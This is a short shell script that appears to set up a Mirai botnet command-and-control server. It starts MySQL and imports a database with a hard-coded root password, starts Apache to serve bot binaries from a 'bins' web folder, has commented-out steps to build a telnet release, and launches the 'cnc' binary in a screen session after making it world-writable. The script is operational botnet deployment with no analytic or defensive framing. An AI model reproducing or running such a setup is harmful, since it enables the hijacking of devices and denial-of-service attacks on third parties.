service mysql start
cat /home/tools/db.sql | mysql --user=root --password=root

# start apache service
/etc/init.d/apache2 start
#cd /home
#bash ./build.sh release telnet #(input 10.1.1.2)
#cd release
bash /home/apache2.sh
#cp /home/debug/mirai.dbg /var/www/html/bins/mirai.dbg
chmod 777 /home/debug/cnc
screen -S cnc /home/debug/cnc #(just ./cnc if another screen isn't necessary)